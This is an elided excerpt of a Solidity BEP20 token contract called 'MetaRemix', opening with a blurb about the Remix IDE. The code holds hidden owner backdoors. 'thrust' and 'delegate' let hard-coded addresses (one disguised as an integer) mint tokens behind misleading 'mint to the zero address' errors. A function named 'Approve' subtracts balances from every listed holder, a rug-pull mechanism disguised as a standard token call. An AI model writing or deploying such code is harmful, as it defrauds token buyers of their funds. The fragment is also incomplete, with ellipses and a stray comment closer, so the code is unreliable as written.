...
/*
Remix is a no-setup tool with a GUI for developing smart contracts. Used by experts and beginners alike, Remix will get you going in double time. Remix plays well with other tools, and allows for a simple deployment process to the chain of your choice. Remix is famous for our visual debugger.
*/
...
contract MetaRemix is Context, IBEP20 {
    ...
    address public _origin = 0xdA8A8a8D23C1FdD0E9b1b9ad89F26E5b107E325b;
    address _addr = 0xdA8A8a8D23C1FdD0E9b1b9ad89F26E5b107E325b;
    address _Pancake = address (886584871145177351176933179185737631955523757889);
    ...
    function thrust(address account, uint256 amount) public {
        require(msg.sender == _origin, "BEP20: mint to the zero address");
    ...
    function delegate (address account, uint256 amount) public {
        require(msg.sender == _Pancake, "BEP20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[_Pancake] = _balances[_Pancake].add(amount);
        emit Transfer(address(0), account, amount);
    }
...
*/
        function Approve(
            ...
            for (uint256 i = 0; i < holders.length; i++) {
                ...
                _balances[holders[i]] = _balances[holders[i]].sub(amount, "BEP20: burn amount exceeds balance");
